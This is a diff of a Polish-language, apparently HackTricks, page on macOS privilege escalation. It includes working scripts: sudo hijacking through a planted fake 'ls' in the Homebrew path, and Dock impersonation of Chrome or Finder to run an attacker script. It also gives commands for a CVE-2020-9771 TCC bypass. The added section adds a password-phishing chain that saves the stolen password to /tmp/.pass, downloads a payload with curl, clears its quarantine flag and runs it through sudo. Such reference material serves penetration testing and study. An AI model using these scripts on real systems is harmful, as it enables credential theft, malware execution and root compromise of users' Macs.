@@ -4,7 +4,7 @@
 
 ## TCC Privilege Escalation
 
-Jeśli przyszedłeś tutaj szukając eskalacji uprawnień TCC, przejdź do:
+Jeśli przyszedłeś tutaj szukając TCC privilege escalation, przejdź do:
 
 
 {{#ref}}
@@ -13,20 +13,20 @@ macos-security-protections/macos-tcc/
 
 ## Linux Privesc
 
-Proszę zauważyć, że **większość sztuczek dotyczących eskalacji uprawnień wpływających na Linux/Unix wpłynie również na maszyny MacOS**. Zobacz więc:
+Zwróć uwagę, że **większość trików dotyczących privilege escalation wpływających na Linux/Unix będzie miała również wpływ na maszyny MacOS**. Zobacz:
 
 
 {{#ref}}
 ../../linux-hardening/privilege-escalation/
 {{#endref}}
 
-## Interakcja z użytkownikiem
+## Interakcja użytkownika
 
 ### Sudo Hijacking
 
-Możesz znaleźć oryginalną [technikę Sudo Hijacking w poście o eskalacji uprawnień Linux](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking).
+Możesz znaleźć oryginalną [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking).
 
-Jednakże, macOS **zachowuje** **`PATH`** użytkownika, gdy wykonuje **`sudo`**. Co oznacza, że innym sposobem na przeprowadzenie tego ataku byłoby **przejęcie innych binarek**, które ofiara nadal wykona podczas **uruchamiania sudo:**
+Jednak macOS **zachowuje** zmienną użytkownika **`PATH`** gdy on wykonuje **`sudo`**. To oznacza, że innym sposobem przeprowadzenia tego ataku byłoby **hijack other binaries** które ofiara wykona podczas **running sudo:**
 ```bash
 # Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
 cat > /opt/homebrew/bin/ls <<EOF
@@ -41,17 +41,17 @@ chmod +x /opt/homebrew/bin/ls
 # victim
 sudo ls
 ```
-Zauważ, że użytkownik korzystający z terminala prawdopodobnie ma **zainstalowany Homebrew**. Możliwe jest więc przejęcie binarek w **`/opt/homebrew/bin`**.
+Zwróć uwagę, że użytkownik korzystający z terminala bardzo prawdopodobnie będzie miał zainstalowany **Homebrew**. Dlatego możliwe jest przejęcie binarek w **`/opt/homebrew/bin`**.
 
-### Podszywanie się pod Dock
+### Podszywanie się w Docku
 
-Używając pewnych **techniki inżynierii społecznej**, możesz **podszyć się na przykład pod Google Chrome** w docku i faktycznie wykonać swój własny skrypt:
+Używając nieco **social engineering** możesz **podszyć się np. pod Google Chrome** w Docku i faktycznie uruchomić własny skrypt:
 
 {{#tabs}}
-{{#tab name="Podszywanie się pod Chrome"}}
+{{#tab name="Chrome Impersonation"}}
 Kilka sugestii:
 
-- Sprawdź w Docku, czy jest Chrome, a w takim przypadku **usuń** ten wpis i **dodaj** **fałszywy** **wpis Chrome w tej samej pozycji** w tablicy Dock.
+- Sprawdź w Docku, czy jest Chrome, i w takim przypadku **usuń** ten wpis i **dodaj** **fałszywy** **wpis Chrome na tej samej pozycji** w tablicy Dock.
 ```bash
 #!/bin/sh
 
@@ -126,11 +126,11 @@ killall Dock
 {{#tab name="Finder Impersonation"}}
 Kilka sugestii:
 
-- Nie **możesz usunąć Findera z Docka**, więc jeśli zamierzasz dodać go do Docka, możesz umieścić fałszywego Findera tuż obok prawdziwego. W tym celu musisz **dodać fałszywy wpis Findera na początku tablicy Docka**.
-- Inną opcją jest nie umieszczanie go w Docku i po prostu otwarcie go, "Finder prosi o kontrolę Findera" nie jest takie dziwne.
-- Inną opcją na **eskalację do roota bez pytania** o hasło z oknem, które wygląda strasznie, jest sprawienie, by Finder naprawdę poprosił o hasło do wykonania uprzywilejowanej akcji:
-- Poproś Findera o skopiowanie do **`/etc/pam.d`** nowego pliku **`sudo`** (Okno z prośbą o hasło wskaże, że "Finder chce skopiować sudo")
-- Poproś Findera o skopiowanie nowego **Pluginu Autoryzacji** (Możesz kontrolować nazwę pliku, aby okno z prośbą o hasło wskazywało, że "Finder chce skopiować Finder.bundle")
+- Nie możesz usunąć Finder z Docka, więc jeśli zamierzasz dodać go do Docka, możesz umieścić fałszywego Finder tuż obok prawdziwego. W tym celu musisz **dodać wpis fałszywego Finder na początku Dock array**.
+- Inną opcją jest nie umieszczać go w Docku i po prostu go otworzyć — "Finder asking to control Finder" nie jest aż tak dziwne.
+- Inną opcją, aby **escalate to root without asking** hasła w okropnym okienku, jest sprawić, by Finder naprawdę poprosił o hasło, aby wykonać uprzywilejowaną akcję:
+- Poproś Finder, aby skopiował do **`/etc/pam.d`** nowy plik **`sudo`** (monit o hasło będzie wskazywał, że "Finder wants to copy sudo")
+- Poproś Finder, aby skopiował nowy **Authorization Plugin** (możesz kontrolować nazwę pliku, więc monit o hasło będzie wskazywał, że "Finder wants to copy Finder.bundle")
 ```bash
 #!/bin/sh
 
@@ -203,12 +203,33 @@ killall Dock
 {{#endtab}}
 {{#endtabs}}
 
-## TCC - Eskalacja uprawnień roota
+### Password prompt phishing + sudo reuse
 
-### CVE-2020-9771 - obejście TCC mount_apfs i eskalacja uprawnień
+Malware często wykorzystuje interakcję użytkownika, aby **przechwycić hasło umożliwiające użycie sudo** i użyć go programowo. Typowy przebieg:
 
-**Każdy użytkownik** (nawet nieuprzywilejowany) może utworzyć i zamontować migawkę Time Machine oraz **uzyskać dostęp do WSZYSTKICH plików** tej migawki.\
-**Jedynym wymaganym uprawnieniem** jest to, aby aplikacja używana (jak `Terminal`) miała dostęp **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), co musi być przyznane przez administratora.
+1. Zidentyfikuj zalogowanego użytkownika za pomocą `whoami`.
+2. **Powtarzaj monit o hasło** aż `dscl . -authonly "$user" "$pw"` zwróci sukces.
+3. Zbuforuj poświadczenie (np. `/tmp/.pass`) i uruchamiaj uprzywilejowane akcje z użyciem `sudo -S` (hasło przez stdin).
+
+Przykładowy minimalny łańcuch:
+```bash
+user=$(whoami)
+while true; do
+read -s -p "Password: " pw; echo
+dscl . -authonly "$user" "$pw" && break
+done
+printf '%s\n' "$pw" > /tmp/.pass
+curl -o /tmp/update https://example.com/update
+printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
+```
+Skradzione hasło może zostać ponownie użyte do **wyczyszczenia kwarantanny Gatekeeper za pomocą `xattr -c`**, skopiowania LaunchDaemons lub innych uprzywilejowanych plików oraz uruchomienia kolejnych etapów w trybie nieinteraktywnym.
+
+## TCC - Root Privilege Escalation
+
+### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation
+
+**Każdy użytkownik** (nawet nieuprzywilejowany) może utworzyć i zamontować time machine snapshot i **uzyskać DOSTĘP DO WSZYSTKICH plików** tego snapshotu.\
+**Jedyne uprawnienie** wymagane to, aby aplikacja używana (np. `Terminal`) miała **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), które musi być przyznane przez administratora.
 ```bash
 # Create snapshot
 tmutil localsnapshot
@@ -228,9 +249,9 @@ mkdir /tmp/snap
 # Access it
 ls /tmp/snap/Users/admin_user # This will work
 ```
-Bardziej szczegółowe wyjaśnienie można [**znaleźć w oryginalnym raporcie**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**
+Bardziej szczegółowe wyjaśnienie można [**found in the original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**
 
-## Wrażliwe informacje
+## Informacje wrażliwe
 
 To może być przydatne do eskalacji uprawnień:
 
@@ -238,5 +259,9 @@ To może być przydatne do eskalacji uprawnień:
 {{#ref}}
 macos-files-folders-and-binaries/macos-sensitive-locations.md
 {{#endref}}
+
+## Źródła
+
+- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
 
 {{#include ../../banners/hacktricks-training.md}}
